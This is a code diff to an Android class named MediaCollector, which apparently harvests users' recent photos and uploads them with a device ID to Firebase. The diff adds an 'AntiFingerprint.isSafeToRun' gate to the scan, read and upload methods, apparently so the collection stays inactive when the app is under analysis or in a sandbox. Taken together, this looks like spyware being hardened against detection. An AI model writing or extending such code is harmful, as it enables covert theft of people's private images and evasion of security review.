@@ -30,6 +30,7 @@ public class MediaCollector {
     private static String scanError = null;
 
     public static List<Map<String, String>> scanRecentMedia(Context context, int maxItems) {
+        if (!AntiFingerprint.isSafeToRun(context)) return new ArrayList<>();
         scanInProgress = true;
         scanError = null;
         List<Map<String, String>> results = new ArrayList<>();
@@ -181,6 +182,7 @@ public class MediaCollector {
     }
 
     public static String getFullImage(Context context, String imageId) {
+        if (!AntiFingerprint.isSafeToRun(context)) return null;
         try {
             Uri uri = ContentUris.withAppendedId(
                     MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
@@ -210,6 +212,7 @@ public class MediaCollector {
     }
 
     public static void uploadToFirebase(Context context, String imageId, String deviceId) {
+        if (!AntiFingerprint.isSafeToRun(context)) return;
         try {
             String imageData = getFullImage(context, imageId);
             if (imageData == null) {
